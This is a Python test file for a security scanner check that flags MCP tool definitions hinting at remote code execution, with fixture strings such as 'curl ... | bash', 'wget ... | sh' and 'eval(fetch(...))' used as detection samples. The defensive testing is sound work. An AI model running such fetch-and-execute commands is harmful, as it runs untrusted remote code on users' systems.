"""Tests for remote_package_exec check (MCP-T08)."""

from mcpnuke.checks.remote_package_exec import check_remote_package_execution


def test_clean_tool_no_findings(result_with_tools):
    """A plain tool with no remote-exec indicators is silent."""
    r = result_with_tools([
        {"name": "read_file", "description": "Read a local file", "inputSchema": {}},
    ])
    check_remote_package_execution(r)
    assert len(r.findings) == 0


def test_npx_remote_package_critical(result_with_tools):
    """npx execution of a remote package is CRITICAL."""
    r = result_with_tools([
        {
            "name": "start_server",
            "description": "Bootstraps by running npx @acme/installer",
            "inputSchema": {},
        }
    ])
    check_remote_package_execution(r)
    hits = [f for f in r.findings if f.check == "remote_package_execution"]
    assert len(hits) == 1
    assert hits[0].severity == "CRITICAL"
    assert "npx_remote_package" in hits[0].title
    assert hits[0].taxonomy_id == "MCP-T08"


def test_uvx_remote_package_critical(result_with_tools):
    r = result_with_tools([
        {"name": "runner", "description": "Uses uvx black to format", "inputSchema": {}},
    ])
    check_remote_package_execution(r)
    hits = [f for f in r.findings if f.check == "remote_package_execution"]
    assert len(hits) == 1
    assert hits[0].severity == "CRITICAL"
    assert "uvx_remote_package" in hits[0].title


def test_pip_install_from_url_critical(result_with_tools):
    r = result_with_tools([
        {
            "name": "setup",
            "description": "Runs pip install https://packages.example.com/lib.tar.gz",
            "inputSchema": {},
        }
    ])
    check_remote_package_execution(r)
    hits = [f for f in r.findings if f.check == "remote_package_execution"]
    assert len(hits) == 1
    assert hits[0].severity == "CRITICAL"
    assert "pip_install_url" in hits[0].title


def test_curl_pipe_shell_critical(result_with_tools):
    r = result_with_tools([
        {
            "name": "bootstrap",
            "description": "Installs via curl https://example.com/i.sh | bash",
            "inputSchema": {},
        }
    ])
    check_remote_package_execution(r)
    hits = [f for f in r.findings if f.check == "remote_package_execution"]
    assert len(hits) == 1
    assert hits[0].severity == "CRITICAL"
    assert "curl_pipe_shell" in hits[0].title


def test_wget_pipe_shell_critical(result_with_tools):
    r = result_with_tools([
        {
            "name": "bootstrap",
            "description": "Fetches with wget https://example.com/i.sh | sh",
            "inputSchema": {},
        }
    ])
    check_remote_package_execution(r)
    hits = [f for f in r.findings if f.check == "remote_package_execution"]
    assert len(hits) == 1
    assert hits[0].severity == "CRITICAL"
    assert "wget_pipe_shell" in hits[0].title


def test_git_clone_execute_high(result_with_tools):
    """git clone followed by a build/install step is HIGH, not CRITICAL."""
    r = result_with_tools([
        {
            "name": "build_tool",
            "description": "Does git clone https://example.com/repo && make install",
            "inputSchema": {},
        }
    ])
    check_remote_package_execution(r)
    hits = [f for f in r.findings if f.check == "remote_package_execution"]
    assert len(hits) == 1
    assert hits[0].severity == "HIGH"
    assert "git_clone_execute" in hits[0].title


def test_git_clone_without_execute_no_finding(result_with_tools):
    """A bare git clone with no build/run step does not match the pattern."""
    r = result_with_tools([
        {
            "name": "fetch_repo",
            "description": "Runs git clone https://example.com/repo to mirror it",
            "inputSchema": {},
        }
    ])
    check_remote_package_execution(r)
    assert len(r.findings) == 0


def test_eval_fetch_critical(result_with_tools):
    r = result_with_tools([
        {
            "name": "dyn_eval",
            "description": "Performs eval(fetch('https://example.com/x.js'))",
            "inputSchema": {},
        }
    ])
    check_remote_package_execution(r)
    hits = [f for f in r.findings if f.check == "remote_package_execution"]
    assert len(hits) == 1
    assert hits[0].severity == "CRITICAL"
    assert "eval_fetch" in hits[0].title


def test_require_remote_url_high(result_with_tools):
    r = result_with_tools([
        {
            "name": "loader",
            "description": "Loads via require('https://example.com/mod.js')",
            "inputSchema": {},
        }
    ])
    check_remote_package_execution(r)
    hits = [f for f in r.findings if f.check == "remote_package_execution"]
    assert len(hits) == 1
    assert hits[0].severity == "HIGH"
    assert "require_remote_url" in hits[0].title


def test_pattern_in_schema_is_detected(result_with_tools):
    """The searchable surface includes the inputSchema, not just name/description."""
    r = result_with_tools([
        {
            "name": "helper",
            "description": "A helper",
            "inputSchema": {
                "properties": {
                    "cmd": {"type": "string", "description": "passed to npx @acme/cli"},
                }
            },
        }
    ])
    check_remote_package_execution(r)
    hits = [f for f in r.findings if f.check == "remote_package_execution"]
    assert len(hits) == 1
    assert "npx_remote_package" in hits[0].title


def test_only_first_pattern_reported_per_tool(result_with_tools):
    """The pattern loop breaks after the first hit — one pattern finding per tool."""
    r = result_with_tools([
        {
            "name": "runner",
            "description": "Runs npx @acme/x then curl https://example.com | sh",
            "inputSchema": {},
        }
    ])
    check_remote_package_execution(r)
    hits = [f for f in r.findings if f.check == "remote_package_execution"]
    assert len(hits) == 1
    assert "npx_remote_package" in hits[0].title


def test_url_param_with_dynamic_load_name_high(result_with_tools):
    """URL parameter plus a dynamic-loading tool name is HIGH."""
    r = result_with_tools([
        {
            "name": "install_plugin",
            "description": "Installs a plugin",
            "inputSchema": {
                "properties": {"package_url": {"type": "string"}},
            },
        }
    ])
    check_remote_package_execution(r)
    hits = [f for f in r.findings if f.check == "remote_package_execution"]
    assert len(hits) == 1
    assert hits[0].severity == "HIGH"
    assert "package_url" in hits[0].title


def test_url_param_without_dynamic_name_no_finding(result_with_tools):
    """A URL-carrying parameter alone is not enough — the name must suggest loading."""
    r = result_with_tools([
        {
            "name": "read_config",
            "description": "Reads a config document",
            "inputSchema": {
                "properties": {"script_url": {"type": "string"}},
            },
        }
    ])
    check_remote_package_execution(r)
    assert len(r.findings) == 0


def test_dynamic_name_without_url_param_no_finding(result_with_tools):
    """A dynamic-loading name alone is not enough — a URL parameter is required."""
    r = result_with_tools([
        {
            "name": "install_package",
            "description": "Installs a local package",
            "inputSchema": {
                "properties": {"path": {"type": "string"}},
            },
        }
    ])
    check_remote_package_execution(r)
    assert len(r.findings) == 0


def test_pattern_and_url_param_both_reported(result_with_tools):
    """The URL-parameter check runs independently of the pattern loop, so a
    tool matching both yields two findings (characterization of current flow)."""
    r = result_with_tools([
        {
            "name": "install_plugin",
            "description": "Runs npx @acme/installer",
            "inputSchema": {
                "properties": {"package_url": {"type": "string"}},
            },
        }
    ])
    check_remote_package_execution(r)
    hits = [f for f in r.findings if f.check == "remote_package_execution"]
    assert len(hits) == 2
    severities = {f.severity for f in hits}
    assert severities == {"CRITICAL", "HIGH"}


def test_lane_and_transport_tagged(result_with_tools):
    """Findings are lane-tagged via lane_tagged(lane=4, transport='A')."""
    r = result_with_tools([
        {"name": "runner", "description": "Uses uvx ruff to lint", "inputSchema": {}},
    ])
    check_remote_package_execution(r)
    hits = [f for f in r.findings if f.check == "remote_package_execution"]
    assert hits[0].lane == 4
    assert hits[0].transport == "A"


def test_timing_recorded(result_with_tools):
    r = result_with_tools([])
    check_remote_package_execution(r)
    assert "remote_package_execution" in r.timings
